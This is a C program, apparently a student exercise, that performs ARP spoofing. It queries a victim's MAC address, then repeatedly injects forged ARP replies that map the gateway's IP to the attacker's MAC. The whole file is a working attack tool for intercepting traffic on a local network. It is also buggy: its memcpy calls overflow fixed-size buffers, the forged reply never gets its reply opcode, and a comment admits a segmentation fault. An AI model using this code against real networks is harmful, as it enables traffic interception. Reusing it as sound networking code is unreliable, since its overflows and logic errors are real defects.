#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <pcap.h>
#include <pcap/pcap.h>
#include <net/if.h>
#include <string.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <ifaddrs.h>
#include <unistd.h>
#include "send_arp.h"

struct ARP_PACKET{
    struct ethernet_header ether_h;
    struct arp_header arp_h;
    struct arp_payload arp_py;
};

void my_info_setting(char *dev, uint8_t *ipstr, uint8_t *macstr){

    ifreq ifr;
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, dev, IFNAMSIZ);

    ioctl(s, SIOCGIFHWADDR, &ifr);
    memcpy((char *)macstr, ifr.ifr_hwaddr.sa_data, 48);

    ioctl(s, SIOCGIFADDR, &ifr);
    memcpy((char *)ipstr, ifr.ifr_addr.sa_data+2, 32);
}

void ip_change(char * ip, uint8_t * unchanged_ip){

    char * a = strtok(ip, ".");
    char * b = strtok(NULL, ".");
    char * c = strtok(NULL, ".");
    char * d = strtok(NULL, ".");
    unchanged_ip[0] = (uint8_t)atoi(a);
    unchanged_ip[1] = (uint8_t)atoi(b);
    unchanged_ip[2] = (uint8_t)atoi(c);
    unchanged_ip[3] = (uint8_t)atoi(d);
}

void makeETH_request(struct ethernet_header *eth, uint8_t *attackermac){
    uint8_t eth_dmac_broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; //broadcast
    uint8_t eth_tmac[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00}; //because sender doesn't know target mac
    memcpy(eth->ether_dhost, eth_dmac_broadcast,  6); //sender dst_mac is 0xFF * 6
    memcpy(eth_tmac, attackermac, 6); //mymac is sendermac
    memcpy(eth->ether_shost, eth_tmac, sizeof(eth_tmac)); //targetmac is 0x00 * 6
    eth->ether_type = htons(0x0806); //ARP type == 0x0806
}

void makeARP_header(struct arp_header *arph, uint16_t opcode){
    arph->arp_hw_type = htons(0x0001); //define type of net, ethernet is 0x0001
    arph->arp_protocol = htons(0x0800); //IPv4 is 0x0800
    arph->arp_hw_size = 0x6; // length of mac is 6
    arph->arp_protocol_size = 0x4; // length of ip is 4;
    arph->arp_opcode =htons(opcode); //ARP_request == 0x0001, ARP_reply ==0x0002
}
//arp protocol find mac use ip(sender can find target's mac by using ARP protocol with target's IP)
//define sender mac, ip / target mac, ip
int main(int argc, char* argv[])
{
    if (argc != 4){
        printf("check you input rightly.....\n");
        return -1;
    }//check input argv is right!

    char device[20];
    uint8_t attackermac[6];
    u_char flush[42];
    char errbuf[1000];

    struct ethernet_header eth;
    struct arp_header arh;
    struct arp_payload arpl;
    struct ARP_PACKET arp_packet;

    //make normal packet
    char *dev = argv[1];
    uint8_t ipstr[4];
    uint8_t receiverIP[4];
    uint8_t macstr[6];
    my_info_setting(dev, ipstr, macstr);
    ip_change(argv[2], receiverIP);
    uint8_t targetip[4];
    ip_change(argv[3], targetip);

    //input ethernet header
    makeETH_request(&eth, macstr);
    memcpy(flush, &eth, sizeof (ethernet_header));
    //input arp header
    makeARP_header(&arh, ARPOP_REQUEST);
    memcpy(&flush[14], &arh, sizeof (arp_header));
    memcpy(&flush[22], macstr, 6);
    memcpy(&flush[28], ipstr, 4);
    memcpy(&flush[32], "\x00\x00\x00\x00\x00\x00", 6);
    mempcpy(&flush[38], receiverIP, 4);
    //input arp_payload
    printf("ARP REPLY:\n");
    for(int i = 1; sizeof(flush) >= i; i++){
        printf("%02X ", flush[i - 1]);
        if(i % 16 == 0){
            printf("\n");
        }
    }
    ip_change(argv[3], targetip);
    while(true){
        pcap_t* handle = pcap_open_live(argv[1],1000,1,1000,errbuf);
        pcap_inject(handle, (u_char*)flush, sizeof(flush));
        struct pcap_pkthdr* header;
        const u_char* packet; //packet is storage of reply
        int res = pcap_next_ex(handle, &header, &packet);
        struct ARP_PACKET *arp_reply;
        //it is reply packet?(opcode is in arp_header)
        arp_reply = (struct ARP_PACKET*)packet;
        if (ntohs(arp_reply->arp_h.arp_opcode) != ARPOP_REPLY){
            printf("it is not ARP!\n");
            continue;
        }
        //if it is reply_packet, make reply_packet
        else {
            arp_reply->ether_h.ether_shost; // this is mac_address(sender's mac) attacker want to know!
            printf("\n");
            //now attacker will use gateway IP(target IP), and sender's(victim) mac(allocate to dst mac)
            //segmentation fault....??!!!!!!!!!!
            //now we make arp_reply_reply packet
            //arp_reply_reply_ethernet header
            memcpy(&flush[0], arp_reply->ether_h.ether_shost,6); //dst_mac is victim mac
            memcpy(&flush[6], arp_reply->ether_h.ether_dhost, 6); //src_mac is sender mac
            memcpy(&flush[12], "\x08\x06", 2);
            //arp_reply_reply_reply arp header (it is enough to change opcode)
            makeARP_header(&arh, ARPOP_REPLY);
            //arp_reply_reply arp_payload;
            memcpy(&flush[22], arp_reply->ether_h.ether_dhost, 6); //sender mac is sender mac(mymac)
            memcpy(&flush[28], targetip, 4);//sender ip is gateway ip
            memcpy(&flush[32], arp_reply->ether_h.ether_shost, 6);//target mac is victim mac
            memcpy(&flush[38], arp_reply->arp_py.sender_ip, 4);//target ip is victim ip
            printf("ATTACK REPLY!!: \n");
            for(int i = 1; sizeof(flush) >= i; i++){
                printf("%02X ", flush[i - 1]);
                if(i % 16 == 0){
                    printf("\n");
                }
            }
            printf("\n");
            pcap_t* handle = pcap_open_live(argv[1],1000,1,1000,errbuf);
            pcap_inject(handle, (u_char*)flush, sizeof(flush));
        }
    }
}
